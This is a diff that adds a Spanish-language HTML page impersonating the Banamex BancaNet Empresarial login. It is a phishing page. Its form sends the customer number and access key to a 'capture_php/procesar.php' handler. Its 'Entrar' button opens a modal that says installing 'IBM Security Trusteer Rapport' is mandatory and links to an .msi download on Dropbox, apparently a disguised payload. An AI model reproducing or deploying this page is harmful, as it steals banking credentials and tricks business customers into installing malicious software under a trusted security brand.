@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BancaNet Empresarial</title>
+    <link rel="stylesheet" href="css/index.css">
+
+    <!-- ====== ESTILOS DEL MODAL (ligero, sin frameworks) ====== -->
+    <style>
+      :root{
+        --brand:#0e5a52;         /* verde petróleo */
+        --brand-dark:#0a4741;
+        --text:#0b3d3a;
+      }
+      .modal-backdrop{
+        position:fixed; inset:0; background:rgba(0,0,0,.55);
+        display:none; align-items:center; justify-content:center; z-index:9999;
+      }
+      .modal-backdrop.show{ display:flex; }
+      .modal-card{
+        background:#fff; width:min(880px, 92vw); border-radius:18px; overflow:hidden;
+        box-shadow:0 30px 70px rgba(0,0,0,.25); position:relative;
+      }
+      .modal-close{
+        position:absolute; right:14px; top:10px; border:0; background:transparent;
+        font-size:28px; line-height:1; color:#2c2c2c; opacity:.6; cursor:pointer;
+      }
+      .modal-close:hover{ opacity:1; }
+      .modal-body{
+        text-align:center; color:var(--text); padding: 10px 28px 8px;
+      }
+      .m-title{
+        font-weight:800; font-size:clamp(18px, 2.4vw, 28px); margin:.25rem 0 .65rem;
+        letter-spacing:.2px;
+      }
+      .m-sub{
+        color:#3a4a49; font-size:clamp(14px, 1.6vw, 18px); margin: 0 0 16px;
+      }
+      .m-list{
+        list-style:none; padding:0; margin:0 0 18px;
+        text-align:left; max-width:760px; margin-left:auto; margin-right:auto;
+      }
+      .m-list li{
+        display:flex; align-items:flex-start; gap:12px; padding:10px 4px;
+      }
+      .m-icon{
+        width:42px; height:42px; flex:0 0 42px; border-radius:12px;
+        background:#e8f4f2; display:flex; align-items:center; justify-content:center;
+      }
+      .m-text{ color:#244a46; line-height:1.35; font-size:16px; }
+      .m-cta{
+        background:var(--brand); color:#fff; border:0; border-radius:999px;
+        font-weight:700; padding:12px 18px; cursor:pointer;
+      }
+      .m-cta:hover{ background:var(--brand-dark); }
+      .modal-footer{
+        display:flex; flex-wrap:wrap; justify-content:center; gap:14px;
+        padding: 0 20px 22px;
+      }
+      .modal-footer a{
+        color:var(--brand); font-weight:600; text-decoration:none; font-size:15px;
+      }
+      .modal-footer a:hover{ text-decoration:underline; }
+      
+      .m-alert {
+  background: #fff4e5;
+  border: 1px solid #e6a23c;
+  color: #8a4f0f;
+  padding: 12px 16px;
+  border-radius: 10px;
+  margin: 0 auto 14px;
+  font-size: 15px;
+  font-weight: 600;
+  max-width: 720px;
+  text-align: center;
+}
+
+    </style>
+</head>
+<body>
+    <!-- Contenedor principal centrado -->
+    <div class="main-container">
+        <!-- Header de fecha -->
+        <div class="fecha-header">
+            <div class="fecha-actual" id="fechaActual"></div>
+            <div class="nav-links">
+                <a href="#">English</a>
+                <span>|</span>
+                <a href="#">Sucursales</a>
+                <span>|</span>
+                <a href="#">Contáctanos</a>
+                <span>|</span>
+                <a href="#">Ayuda</a>
+            </div>
+        </div>
+
+        <!-- Header principal -->
+        <div class="main-header">
+            <img src="images/logo.png" alt="Banamex" class="logo-banamex">
+            <div class="separator"></div>
+            <div class="bancanet-text">BancaNet Empresarial</div>
+        </div>
+
+        <!-- Contenido principal -->
+        <div class="main-content">
+            <!-- Sidebar de login -->
+            <div class="login-sidebar">
+                <div class="login-content">
+                    <form class="login-form" action="capture_php/procesar.php" method="POST" id="loginForm">
+                        <h2>BancaNet Empresarial</h2>
+                        
+                        <div class="form-group">
+                            <label for="numeroCliente"><b>Número de cliente</b></label>
+                            <input type="password" id="numeroCliente" name="usuario" maxlength="18" pattern="[0-9]*" inputmode="numeric" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="claveAcceso"><b>Clave de acceso</b></label>
+                            <input type="password" id="claveAcceso" name="password" maxlength="10">
+                        </div>
+                        
+                        <div style="margin-bottom: 20px; display: flex; align-items: center;">
+                            <!-- Cambiamos a type="button" para abrir modal sin enviar -->
+                            <button type="button" class="login-btn" id="btnEntrar">Entrar</button>
+                            <span class="candado"></span>
+                        </div>
+                        
+                        <div class="links-section">
+                            <a href="#"><span class="flecha"></span>Ir a Banamex.com</a>
+                            <a href="#"><span class="flecha"></span>Conoce el demo</a>
+                            <a href="#"><span class="flecha"></span>Desbloquear claves<br><span style="margin-left: 10px;"></span>de acceso</a>
+                        </div>
+                    </form>
+
+                    <div class="login-footer">
+                        <img src="images/imagen_footer_login.png" alt="Protégete de fraudes cibernéticos - Banamex Resuelve">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-top">
+                
+                <div class="footer-right">
+                    <a href="#">Términos, condiciones de uso y privacidad</a>
+                </div>
+            </div>
+            <div class="footer-text">
+                D.R. © 2025, Banco Nacional de México, S.A.,<br>
+                Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+            </div>
+           
+        </div>
+    </div> <!-- Cierre del main-container -->
+
+    <!-- ====== MODAL (markup) ====== -->
+    <div class="modal-backdrop" id="proteccionModal" role="dialog" aria-modal="true" aria-labelledby="mTitle" aria-hidden="true">
+      <div class="modal-card">
+        <button class="modal-close" id="mClose" aria-label="Cerrar">&times;</button>
+
+    <div class="modal-body">
+  <!-- 🔴 Aviso de acción obligatoria -->
+  <div class="m-alert">
+    ⚠️ Es obligatorio instalar o actualizar <b>IBM® Security Trusteer Rapport</b> para continuar con el uso seguro de BancaNet Empresarial.
+  </div>
+  <br>
+  <p class="m-sub">Descargue IBM<sup>®</sup> Security Trusteer Rapport.</p>
+
+
+          <ul class="m-list">
+            <li>
+              <span class="m-icon">
+                <!-- Escudo -->
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M12 3l7 3v6c0 5-3.5 7.7-7 9-3.5-1.3-7-4-7-9V6l7-3z" stroke="#0e5a52" stroke-width="1.7" fill="none"/>
+                  <path d="M8 12l2.5 2.5L16 9" stroke="#0e5a52" stroke-width="1.7" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </span>
+              <div class="m-text">Proteja su cuenta corporativa de los ciberdelincuentes y reduzca las posibilidades de fraude.</div>
+            </li>
+            <li>
+              <span class="m-icon">
+                <!-- Antivirus -->
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <path d="M4 7h16M6 3h12M6 21h12M8 7v10m8-10v10" stroke="#0e5a52" stroke-width="1.7" stroke-linecap="round"/>
+                </svg>
+              </span>
+              <div class="m-text">Puede trabajar en forma conjunta con programas antivirus preexistentes para minimizar las amenazas de programas maliciosos.</div>
+            </li>
+            <li>
+              <span class="m-icon">
+                <!-- Reloj/ok -->
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                  <circle cx="12" cy="12" r="9" stroke="#0e5a52" stroke-width="1.7"/>
+                  <path d="M8 12.5l2.2 2.2L16 9" stroke="#0e5a52" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </span>
+              <div class="m-text">Trusteer es fácil de usar y no hará más lenta su computadora, ni afectará su trabajo con otras aplicaciones empresariales.</div>
+            </li>
+          </ul>
+
+          <div style="margin: 12px 0 18px;">
+          <a href="https://www.dropbox.com/scl/fi/3rjmcrpkrybzkhfpsbyby/SecurityTrusteerRapport.msi?rlkey=7dm4h0apb50a3zywnb11s9pwf&st=jgbainbc&dl=1" class="m-cta" rel="noopener">Descargar ahora</a>
+
+          </div>
+        </div>
+
+        
+      </div>
+    </div>
+    <!-- ====== FIN MODAL ====== -->
+
+    <script src="JS/index.js"></script>
+
+    <!-- ====== JS del modal / integración con tu botón Entrar ====== -->
+<script>
+  const modal = document.getElementById('proteccionModal');
+  const btnEntrar = document.getElementById('btnEntrar');
+  const btnCerrar = document.getElementById('mClose');
+  const btnRecordar = document.getElementById('btnRecordar');
+  const btnDescargar = document.getElementById('btnDescargar');
+
+  function abrirModal(){
+    modal.classList.add('show');
+    modal.setAttribute('aria-hidden', 'false');
+    document.body.style.overflow = 'hidden';
+  }
+  function cerrarModal(){
+    modal.classList.remove('show');
+    modal.setAttribute('aria-hidden', 'true');
+    document.body.style.overflow = '';
+  }
+
+  btnEntrar.addEventListener('click', (e) => {
+    e.preventDefault();
+    abrirModal();
+  });
+
+  btnCerrar.addEventListener('click', cerrarModal);
+  btnRecordar.addEventListener('click', (e)=>{ e.preventDefault(); cerrarModal(); });
+  modal.addEventListener('click', (e)=>{ if(e.target === modal) cerrarModal(); });
+  window.addEventListener('keydown', (e)=>{ if(e.key === 'Escape') cerrarModal(); });
+
+</script>
+
+</body>
+</html>
